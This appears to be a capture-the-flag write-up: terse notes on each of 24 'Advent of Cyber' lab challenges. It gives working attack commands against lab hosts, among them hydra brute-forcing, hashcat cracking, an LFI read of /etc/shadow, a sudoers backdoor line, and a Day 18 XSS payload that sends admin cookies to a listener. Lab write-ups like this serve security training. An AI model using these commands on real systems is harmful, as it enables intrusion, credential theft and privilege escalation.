# Advent of Cyber

## Day 1: Inventory Management
-------------------------------
+ Decoded the `authid` cookie to get the fixed part of cookie.
+ Modify the value, base64 and resupply to obtain admin access. 

## Day 2: Arctic Forum
----------------------------
+ Used gobuster to enumerate paths: `gobuster dir -u http://$IP:3000 -w rockyou.txt`
+ Found a hidden /sysadmin route, comments point to a github repo containing default creds.

## Day 3: Evil Elf
---------------------------
+ Found destination IP of packet 998 using filter: `frame.number==998`
+ Found data by looking for http, telnet & FTP protocols using Protocol Hierarchy. 
+ Cracked shadow file password using hashcat: `hashcat -m 1800 hash rockyou.txt`

## Day 4: Training
------------------------
+ SSHed into machine using given credentials.
+ Used `grep -rl "password"` to find string in N files.
+ Used grep with regex `grep -rl "[0-5]\\.[0-2]"` to find IP hidden in N files.
+ Calculate sha1 hash using `sha1sum`.
+ Look for file.bak if you can't access the actual files (shadow.bak).

## Day 5: Ho-Ho-Hosint
----------------------------
+ Found birthday through Twitter.
+ Wayback Machine, Tweets, Reverse Image Searchs

## Day 6: Data Elf-iltration
------------------------------
+ Found a URL in DNS packets of a pcap file. 
+ Decoded hexadecimal values to read exfiltrated data.
+ Extracted a zip file and an image file.
+ Bruteforced password protected zip file: `fcrackzip -b -m 2 -D -p rockyou.txt christmaslists.zip`
+ Used steghide to extract a file. 

## Day 7: Skilling Up
--------------------------
+ Used nmap to find open ports and services.
+ Look into TCP/IP fingerprint to determine OS.

## Day 8: SUID Shenanigans
---------------------------
+ Ran an all ports nmap scan to find the non-standard ssh port.
+ Logged in as holly.
+ `find` and `nmap` running as igor.
+ `find . -name flag1.txt -exec cat -n {} \;` -> to output flag contents.
+ Used linpeas to enumerate and privilege escalate.
+ Found a SUID binary running any and all system commands with root privileges. 

## Day 9: Requests
--------------------
+ Wrote a simple python script to enumerate flag.
```
import requests

url = "http://$IP:3000/"
response = requests.get(url)
data = response.json()

flag = ""

while data['next'] != "end":
	flag += data['value']
	response = requests.get(url + data['next'])
	data = response.json()

print(flag)
```

## Day 10: Metasploit-a-ho-ho-ho
---------------------------------
+ Found /showcase.action path.
+ Googled to find struts2 content type ognl exploit in metasploit.
+ Exploited the vuln to get root access.
+ Got a better shell: `script -qc /bin/bash /dev/null` and `export XTERM=xterm-256color`

## Day 11: Elf Applications
--------------------------------
+ FTP server running with anonymous login allowed.
+ Logged in to find credentials for SQL database.
+ NFS service present with share `/opt/files` using `showmount -e $IP`.
+ Mounted using `mount $IP:/opt/files /mountDir` to obtain creds.txt file.
+ Connected to mysql to obtain creds: `mysql --protocol=tcp --host=$IP --port=3306 --user=DB_USER_NAME -p`

## Day 12: Elfcryption
-------------------------
+ Calculate md5 using `md5sum`
+ Decrypt using passphrase with `gpg -d note1.txt.gpg`
+ Decrypt using: `openssl rsautl -decrypt -inkey private.key -in note2_encrypted.txt -out plaintext.txt`

## Day 13: Accumulate
-----------------------
+ Found a web server running and hidden path at /retro.
+ Found user creds for wordpress by reading blog posts and comments.
+ Used the same creds to RDP into the PC: `xfreerdp /u:wade /p:parzival /v:$IP`
+ Escalated privilege by leveraging CVE 2019-1388

## Day 14: Unknown Storage
----------------------------
+ Look into s3 bucket: `aws s3 ls s3://advent-bucket-one`
+ Get file: `aws s3 cp s3://advent-bucket-one/file.txt .`

## Day 15: LFI
----------------
+ Ran nmap, found notes on website.
+ Hints to LFI vuln, LFi found as `http://$IP/get-file/../../../etc/shadow`
+ Cracked password using hashcat and rockyou.txt.

## Day 16: File Confusion
---------------------------
+ Extract all files in the directory by using a simple python script.
+ `grep -rl "Version" | wc -l` to count the number of files with 'Version' in them.
+ `grep -rni "password"` to find the file with the password.

## Day 17: Hydra-ha-ha-haa
----------------------------
+ A login page is present on default port.
+ Bruteforcing using hydra: `hydra -l molly -P rockyou.txt $IP http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"` to obtain web portal password.
+ Bruteforced using hydra to obtain SSH creds: `hydra -l molly -P rockyou.txt $IP -t 4 ssh`

## Day 18: ELF JS
-------------------
+ The page contains an XSS vuln.
+ Open a listener to capture admin cookie: `nc -nlvkp 8000`
+ Payload sent as a forum post: `<script>new Image().src="$IP:8000/stolencookie.php?cookie="+document.cookie;</script>`

## Day 19: Commands
----------------------
+ Executed URL encoded commands at endpoint /api/cmd to obtain user.txt contents.

## Day 20: Cronjob Privilege Escalation
-------------------------------------------
+ Ran an nmap port scan, found SSH on port 4567.
+ Bruteforced into SSH using hydra: `hydra -l sam -P ../rockyou.txt $IP -s 4567 -t 4 ssh`
+ SSHed into the machine and ran linpeas.
+ Found a SUID bit script clearing /tmp files every minute.
+ Added the following line in sudoers file to grant sam superuser privileges: `echo "sam ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers`

## Day 21: Reverse Elf-ineering
--------------------------------
+ Use `r2 -A binary_name` to analyze binary.
+ `afl | grep main` to find the main function.
+ Run `pdf @main` to disasemble.
+ Set breakpoint with `db 0x00400b58`.
+ Step through using `ds`, continue using `dc` and print registers using `dr`.
+ Print the memory in hex using `px @rbp-0x4`.

## Day 22: If Santa, Then Christmas
------------------------------------
+ Similar to previous task, use radare2 commands to reverse engineer binary. 

## Day 23: LapLANd (SQL Injection)
-----------------------------------
+ Used SQLmap to enumerate db.
+ Logged in as user to upload reverse shell script.

## Day 24: Elf Stack
------------------------
+ Ran nmap scan to enumerate open ports and services.
+ Kibana running on 5601, ElasticSearch on 9200 (HTTP Interface) and 9300 (Communication).
+ Get the indices: `http://$IP:9200/_cat/indices?v` 
+ Read messages: `curl http://$IP:9200/messages/_search?size=200 | jq '.hits.hits[]._source.message'` 
+ Found credentials in messages.
+ Exploited CVE-2018-17246 to perform file inclusion. 
